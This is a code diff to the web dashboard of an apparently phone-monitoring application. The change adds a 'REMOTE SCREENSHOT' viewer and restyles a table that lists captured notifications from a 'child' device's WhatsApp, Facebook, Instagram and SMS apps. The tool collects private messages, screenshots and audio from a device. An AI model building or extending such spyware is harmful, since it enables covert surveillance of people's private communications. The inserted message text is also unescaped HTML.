@@ -334,6 +334,23 @@
         </div>
     </div>
 
+    <!-- Screenshot Popup Modal -->
+    <div id="screenshot-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.95); z-index: 9999; display: flex; align-items: center; justify-content: center;">
+        <div class="card p-2 text-center" style="max-width: 90vw; border-radius: 20px; overflow: hidden;">
+            <div class="card-header bg-white border-0 d-flex justify-content-between align-items-center p-3">
+                <h6 class="m-0 fw-bold"><i class="fas fa-camera-retro me-2 text-primary"></i>REMOTE SCREENSHOT</h6>
+                <button class="btn-close" onclick="document.getElementById('screenshot-modal').classList.add('d-none')"></button>
+            </div>
+            <div style="max-height: 70vh; overflow-y: auto; background: #eee;">
+                <img id="screenshot-img" src="" style="width: 100%; height: auto;">
+            </div>
+            <div class="p-3 d-flex gap-2">
+                <button class="btn btn-secondary flex-grow-1" onclick="document.getElementById('screenshot-modal').classList.add('d-none')">CLOSE</button>
+                <a id="screenshot-download" href="#" class="btn btn-primary flex-grow-1"><i class="fas fa-download me-2"></i>SAVE IMAGE</a>
+            </div>
+        </div>
+    </div>
+
     <!-- Professional Popup for Photos -->
     <div id="image-modal" class="position-fixed top-0 start-0 w-100 h-100 d-none" style="background: rgba(15,23,42,0.95); z-index: 9999; display: flex; align-items: center; justify-content: center;">
         <div class="text-center">
@@ -413,28 +430,45 @@
 
         socket.on('child_notification', (data) => {
             const body = document.getElementById('notif-list');
-            const row = `<tr>
-                <td><span class="badge bg-secondary">${data.app}</span></td>
-                <td class="fw-bold">${data.title}</td>
-                <td>${data.text}</td>
+            let appIcon = 'fa-bell';
+            let color = 'bg-secondary';
+
+            const pkg = data.app.toLowerCase();
+            if(pkg.includes('whatsapp')) { appIcon = 'fa-whatsapp text-success'; color = 'bg-success'; }
+            else if(pkg.includes('facebook') || pkg.includes('messenger')) { appIcon = 'fa-facebook text-primary'; color = 'bg-primary'; }
+            else if(pkg.includes('instagram')) { appIcon = 'fa-instagram text-danger'; color = 'bg-danger'; }
+            else if(pkg.includes('sms') || pkg.includes('message')) { appIcon = 'fa-comment-dots text-info'; color = 'bg-info'; }
+
+            const row = `<tr class="align-middle">
+                <td>
+                    <div class="d-flex align-items-center">
+                        <i class="fab ${appIcon} me-2 fa-lg"></i>
+                        <span class="badge ${color} rounded-pill">${data.app}</span>
+                    </div>
+                </td>
+                <td class="fw-bold text-dark">${data.title}</td>
+                <td style="max-width: 400px; overflow: hidden; text-overflow: ellipsis;">
+                    <div class="p-2 bg-light rounded" style="border-left: 4px solid var(--primary)">
+                        ${data.text}
+                    </div>
+                </td>
                 <td class="text-muted small">${new Date().toLocaleTimeString()}</td>
             </tr>`;
             body.insertAdjacentHTML('afterbegin', row);
             log(`Notification: [${data.app}] ${data.title}`);
-
-            // Auto-switch to tab if needed or show a toast
-            if(Notification.permission === "granted") {
-                new Notification(`New from ${data.app}`, { body: data.text });
-            }
         });
 
         socket.on('child_screenshot_taken', (data) => {
+            const modal = document.getElementById('screenshot-modal');
+            const img = document.getElementById('screenshot-img');
+            const download = document.getElementById('screenshot-download');
             const url = '/captured_screenshot.jpg?t=' + Date.now();
-            document.getElementById('modal-img').src = url;
-            document.getElementById('photo-title').innerText = "SCREENSHOT CAPTURE";
-            document.getElementById('download-link').href = url;
-            document.getElementById('image-modal').classList.remove('d-none');
-            log("System: Screenshot received!");
+
+            img.src = url;
+            download.href = url;
+            download.setAttribute('download', `screenshot_${Date.now()}.jpg`);
+            modal.classList.remove('d-none');
+            log("System: New screenshot capture ready!");
         });
 
         socket.on('audio_ready', (data) => {
